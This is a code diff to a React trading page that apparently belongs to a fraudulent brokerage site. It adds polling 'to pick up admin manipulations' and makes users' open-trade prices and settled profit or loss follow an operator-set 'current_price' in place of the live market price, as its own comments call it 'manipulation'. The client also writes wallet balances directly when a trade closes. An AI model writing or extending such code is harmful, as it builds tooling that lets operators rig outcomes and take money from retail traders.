@@ -347,6 +347,29 @@ const Trading = () => {
 
   useEffect(() => { fetchData(); }, [user]);
 
+  // Re-fetch open trades every 5s to pick up admin manipulations
+  useEffect(() => {
+    if (!user) return;
+    const interval = setInterval(async () => {
+      const { data: openT } = await supabase
+        .from("trades").select("*, assets(symbol, name)")
+        .eq("user_id", user.id).eq("status", "open")
+        .order("opened_at", { ascending: false });
+      if (openT) setOpenTrades(openT as Trade[]);
+      // Also refresh closed trades and balance
+      const { data: closedT } = await supabase
+        .from("trades").select("*, assets(symbol, name)")
+        .eq("user_id", user.id).eq("status", "closed")
+        .order("closed_at", { ascending: false }).limit(20);
+      if (closedT) setClosedTrades(closedT as Trade[]);
+      const { data: wallet } = await supabase
+        .from("wallets").select("balance")
+        .eq("user_id", user.id).eq("currency", "EUR").maybeSingle();
+      if (wallet) setBalance(Number(wallet.balance));
+    }, 5000);
+    return () => clearInterval(interval);
+  }, [user]);
+
   // Refresh prices every 30 seconds
   useEffect(() => {
     if (!assets.length) return;
@@ -514,7 +537,8 @@ const Trading = () => {
 
   const closeTrade = async (trade: Trade) => {
     const symbol = trade.assets?.symbol ?? "";
-    const pnl = computeLivePnl(trade, livePrices[symbol] || undefined);
+    const priceForPnl = trade.current_price ? Number(trade.current_price) : (livePrices[symbol] || undefined);
+    const pnl = computeLivePnl(trade, priceForPnl);
     await supabase.from("trades").update({ status: "closed", closed_at: new Date().toISOString() }).eq("id", trade.id);
     const { data: wallet } = await supabase.from("wallets").select("id, balance").eq("user_id", user!.id).eq("currency", "EUR").maybeSingle();
     if (wallet) await supabase.from("wallets").update({ balance: Number(wallet.balance) + Number(trade.size) + pnl }).eq("id", wallet.id);
@@ -966,7 +990,9 @@ const Trading = () => {
                   <tbody>
                     {openTrades.map(t => {
                       const symbol = t.assets?.symbol;
-                      const pnl = computeLivePnl(t, livePrices[symbol ?? ""] || undefined);
+                      // Use admin-set current_price if available (manipulation), otherwise live market price
+                      const priceForPnl = t.current_price ? Number(t.current_price) : (livePrices[symbol ?? ""] || undefined);
+                      const pnl = computeLivePnl(t, priceForPnl);
                       const tradeIcon = t.assets ? getAssetIcon(t.assets.symbol, null) : null;
                       return (
                         <tr key={t.id} className="border-b last:border-0 hover:bg-muted/20 transition-colors">
@@ -990,7 +1016,7 @@ const Trading = () => {
                           </td>
                           <td className="p-3.5 font-medium">€{Number(t.size).toLocaleString()}</td>
                           <td className="p-3.5 text-muted-foreground">€{Number(t.entry_price).toFixed(2)}</td>
-                          <td className="p-3.5">€{Number(t.current_price ?? t.entry_price).toFixed(2)}</td>
+                          <td className="p-3.5">€{(t.current_price ? Number(t.current_price) : (livePrices[symbol ?? ""] || Number(t.entry_price))).toFixed(2)}</td>
                           <td className="p-3.5">{t.leverage}×</td>
                           <td className={`p-3.5 font-bold ${pnl >= 0 ? "text-success" : "text-destructive"}`}>
                             {pnl >= 0 ? "+" : ""}€{pnl.toFixed(2)}
